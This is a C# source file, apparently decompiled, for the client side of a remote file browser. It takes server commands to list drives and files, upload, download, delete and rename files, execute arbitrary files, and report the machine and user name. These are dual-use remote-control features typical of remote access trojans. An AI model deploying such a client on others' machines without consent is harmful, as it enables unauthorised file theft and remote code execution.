using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;

namespace FileBrowserClient
{
    internal sealed class CommandHandlers
	{
		public static void HandleCreateDirectory(string remoteDir)
		{
			Functions.LogMessage(string.Format("Creating directory '{0}'..", remoteDir));
			try
			{
				Directory.CreateDirectory(remoteDir);
			}
			catch (Exception ex)
			{
			}
		}

		public static void HandleDeleteFile(string remoteFile, bool isDirectory)
		{
			try
			{
				if (isDirectory)
				{
					Directory.Delete(remoteFile, true);
				}
				else
				{
					File.Delete(remoteFile);
				}
			}
			catch (Exception ex)
			{
				ClientMain.LoggingHost.LogClientException(ex, "HandleDeleteFile");
			}
			SendFiles();
		}

		public static void HandleOpenFile(string remoteFile)
		{
			Process.Start(remoteFile);
		}

		public static void HandleReceiveFile(string remoteFile, string localFile)
		{
			Functions.LogMessage(string.Format("Downloading '{0}' from server..", localFile));
			File.WriteAllBytes(localFile, Convert.FromBase64String(remoteFile));
			SendFiles();
		}

		public static void HandleRenameFile(string remoteFile, string newFileName, bool isDirectory)
		{
			try
			{
				Functions.LogMessage(string.Format("Renaming '{0}' to '{1}'..", remoteFile, newFileName));
				if (isDirectory)
				{
					Directory.Move(remoteFile, newFileName);
				}
				else
				{
					File.Move(remoteFile, newFileName);
				}
			}
			catch (Exception ex)
			{
			}
		}

		public static void HandleSetCurrentDirectory(string path)
		{
			ClientMain.CurrentDirectory = path;
			ClientMain.NetworkHost.SendToServer(null, true, new object[]
			{
				CommandTypes.SetCurrentDirectory,
				ClientMain.CurrentDirectory
			});
			Functions.LogMessage(string.Format("Current directory set to '{0}'.", path));
		}

		public static void HandleDelete(object[] @params)
		{
			Functions.LogMessage(string.Format("Deleting '{0}'..", RuntimeHelpers.GetObjectValue(@params[1])));
			HandleDeleteFile(Convert.ToString(@params[1]), Convert.ToBoolean(@params[2]));
		}

		public static void HandleDownload(object[] @params)
		{
			Functions.LogMessage(string.Format("Downloading '{0}'..", Convert.ToString(@params[2])));
			SendFile(Convert.ToString(@params[1]), Convert.ToString(@params[2]));
		}

		public static void HandleDrives(object[] @params)
		{
			Functions.LogMessage("Getting remote drives..");
			SendDrives();
		}

		public static void HandleFiles(object[] @params)
		{
			Functions.LogMessage("Refreshing file list..");
			SendFiles();
		}

		public static void HandleGetCurrentDirectory(object[] @params)
		{
			Functions.LogMessage("Getting remote directory..");
			SendCurrentDirectory();
		}

		public static void HandleMachineName(object[] @params)
		{
			Functions.LogMessage("Getting machine name..");
			SendMachineName();
		}

		public static void HandleOpen(object[] @params)
		{
			Functions.LogMessage(string.Format("Executing '{0}'..", RuntimeHelpers.GetObjectValue(@params[1])));
			HandleOpenFile(Convert.ToString(@params[1]));
		}

		public static void HandleSetCurrentDirectoryPacket(object[] @params)
		{
			Functions.LogMessage("Setting remote directory..");
			HandleSetCurrentDirectory(@params[1].ToString());
		}

		public static void HandleUpload(object[] @params)
		{
			HandleReceiveFile(Convert.ToString(@params[1]), Convert.ToString(@params[2]));
		}

		public static void HandleRename(object[] @params)
		{
			HandleRenameFile(Convert.ToString(@params[1]), Convert.ToString(@params[2]), Convert.ToBoolean(@params[3]));
		}

		public static void HandleCreate(object[] @params)
		{
			Functions.LogMessage(string.Format("Creating directory '{0}'..", RuntimeHelpers.GetObjectValue(@params[1])));
			HandleCreateDirectory(Convert.ToString(@params[1]));
		}

		public static void SendCurrentDirectory()
		{
			ClientMain.NetworkHost.SendToServer(null, true, new object[]
			{
				CommandTypes.GetCurrentDirectory,
				ClientMain.CurrentDirectory
			});
			Functions.LogMessage("Current directory sent to server.");
		}

		public static void SendDrives()
		{
			Functions.EnumerateRemoteDrives();
			string text = string.Empty;
			try
			{
				foreach (string text2 in Functions.RemoteDrives)
				{
					text = text + text2.Trim() + "|";
				}
			}
			finally
			{
			}
			ClientMain.NetworkHost.SendToServer(null, true, new object[]
			{
				CommandTypes.Drives,
				text
			});
			Functions.LogMessage("Remote drives sent to server.");
		}

		public static void SendFile(string remoteFile, string localFile)
		{
			string text = Convert.ToBase64String(File.ReadAllBytes(remoteFile));
			ClientMain.NetworkHost.SendToServer(null, true, new object[]
			{
				CommandTypes.Download,
				text,
				localFile
			});
			Functions.LogMessage(string.Format("Sending '{0}' to server..", remoteFile));
		}

		public static void SendFiles()
		{
			Functions.EnumerateRemoteFiles(ClientMain.CurrentDirectory);
			string text = string.Empty;
			try
			{
				foreach (string text2 in Functions.RemoteFolders)
				{
					bool flag = !string.IsNullOrEmpty(text2);
					if (flag)
					{
						text = text + text2.Trim() + "|";
					}
				}
			}
			finally
			{

			}
			try
			{
				foreach (string text3 in Functions.RemoteFiles)
				{
					bool flag = !string.IsNullOrEmpty(text3);
					if (flag)
					{
						text = text + text3.Trim() + "|";
					}
				}
			}
			finally
			{

			}
			ClientMain.NetworkHost.SendToServer(null, true, new object[]
			{
				CommandTypes.Files,
				text
			});
			Functions.LogMessage("Remote files/folders sent to server.");
		}

		public static void SendMachineName()
		{
			ClientMain.NetworkHost.SendToServer(null, true, new object[]
			{
				CommandTypes.MachineName,
				string.Format("{0}/{1}", Environment.MachineName.ToUpper(), Environment.UserName)
			});
			Functions.LogMessage("Machine name sent to server.");
		}
	}
}